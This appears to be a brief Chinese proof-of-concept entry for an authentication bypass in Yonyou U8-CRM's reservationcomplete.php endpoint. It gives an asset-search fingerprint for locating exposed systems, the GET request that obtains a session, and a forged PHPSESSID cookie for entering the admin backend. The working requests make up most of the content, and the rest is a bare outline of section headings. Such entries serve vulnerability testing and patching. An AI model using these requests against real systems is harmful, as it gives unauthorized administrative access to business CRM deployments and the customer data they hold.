# 用友U8-CRMreservationcomplete存在身份认证绕过漏洞

- **系统**：用友　|　**类型**：认证/授权绕过　|　**CVE**：—
- **指纹**：`app.name="用友 CRM"`
- **请求**：`GET /background/reservationcomplete.php?ID=1 HTTP/1.1`

**请求体 / payload**
```
1. 获取cookie
Host:
2. 进入后台
GET / HTTP/1.1
Host:
Cookie: PHPSESSID=bgsesstimeout-; path=/

```

**其他**
- 用友U8-CRM reservationcomplete存在身份认证绕过漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友U8-CRM